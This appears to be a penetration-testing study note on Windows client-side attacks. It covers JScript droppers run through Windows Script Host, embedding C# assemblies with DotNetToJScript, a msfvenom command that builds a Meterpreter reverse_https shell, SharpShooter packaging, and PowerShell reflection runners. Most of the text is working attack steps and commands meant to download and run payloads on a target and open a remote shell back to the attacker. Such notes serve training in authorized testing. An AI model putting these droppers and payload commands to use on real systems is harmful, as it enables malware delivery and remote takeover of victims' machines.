## Basic Dropper in Jscript
Jscript is developed by Microsft that used in Internet Explorer. It can also be executed outside the browser through Windows Script Host(an automation technology for Microsoft Windows operating systems that provides scripting abilities think like batch files, but beefer).
We can use jscript to interact with ActiveX( software framework created by Microsoft back in 1996, it was desiged for content downloaded from a network(IE)) Consider the following code, We invoke **ActiveXObject** and use **WScript.Shell** to interact with the Windows Script Host Shell to execute external application. The file extension should be .js

```
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

Method 1: Let's Create [Jscript payload Dropper](/ClientSideWithWindowsScriptHost/JscriptPayloadDropper.js) to download and execute payload from our wbesite.
Method 2: To Do, Let's make the dropper proxy-aware, research setProxy method, Page 107.

## Mix Jscript and C#
Let's run payload completely from memory by using Win32 APIs. We can't invoke Win32API directly from Jscript. We'll embed a complited C# assembly in the Jscript file and execute it. We will need to use the [DotNetToJScript github code](https://github.com/tyranid/DotNetToJScript), once complie the example source code, we will use [DotNetToJScript.exe](/ClientSideWithWindowsScriptHost/DotNetToJScript.exe) with [NDesk.Options.dll](/ClientSideWithWindowsScriptHost/NDesk.Options.dll) to compile [ExampleAssembly.dll](/ClientSideWithWindowsScriptHost/DotNetToJScript.exe) into an [demo.js](/ClientSideWithWindowsScriptHost/demo.js) jscript.

```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```

Now, We can modify the default TestClass.cs to write our [payload dropper](/ClientSideWithWindowsScriptHost/TestClass.cs ) in c# and conver it to jscript using the same DotNetToJScript.exe command.

The above method can also be done by using [SharpShoter](https://github.com/mdsecactivebreach/SharpShooter) framework.

First,Create a raw payload

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f raw -o /var/www/html/shell.txt
```

then invoke SharpShooter.py to compile js code

```
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
```

## Reflection powershell with pre-compiled C# assembly

Now we can use the same code to compile a new dll to used in powershell.
- 1.Create a New **Class Libary .NET Framework project**
- 2.use the same ttps and compile the [cs code](/ClientSideWithWindowsScriptHost/Class1.cs) into dll
- 3.create powershell [payload dropper](/ClientSideWithWindowsScriptHost/reflectionRunner.ps1).
